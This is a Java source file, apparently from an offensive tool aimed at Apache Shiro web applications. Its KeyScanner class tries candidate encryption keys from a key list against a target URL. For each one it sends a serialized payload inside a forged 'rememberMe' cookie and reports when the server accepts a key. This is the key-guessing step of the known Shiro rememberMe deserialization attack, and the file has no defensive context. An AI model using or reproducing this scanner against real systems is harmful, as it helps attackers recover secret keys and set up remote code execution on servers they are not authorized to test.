package core.scan;

import core.conn.ShiroHttpConnection;
import core.payload.ScanKey;
import core.util.Util;

import java.io.File;
import java.util.Scanner;

public class KeyScanner implements ShiroScanner {

    private String base;

    @Override
    public void setBase(String base) {
        this.base = base;
    }

    @Override
    public void scan() throws Exception {
        Scanner scanner = new Scanner(new File("src/main/resources/key"));
        String key = "";
        boolean falseKey = true;
        while (scanner.hasNextLine() && falseKey) {
            ShiroHttpConnection connection = new ShiroHttpConnection(base);
            Util util = new Util();
            ScanKey scanKey = new ScanKey();
            key = scanner.nextLine();
            byte[] serialize = util.serialize(scanKey.getObjectPayload(null));
            String rememberMe = util.getRememberMe(serialize, key);
            System.out.println("[+] Test key: " + key);
            falseKey = connection.checkFalseKey(rememberMe);
        }
        if (!falseKey) {
            System.err.println("[*] Found Key: " + key);
        } else {
            System.err.println("[*] No Key Found");
        }
    }

    public static void main(String[] args) throws Exception {
    }
}
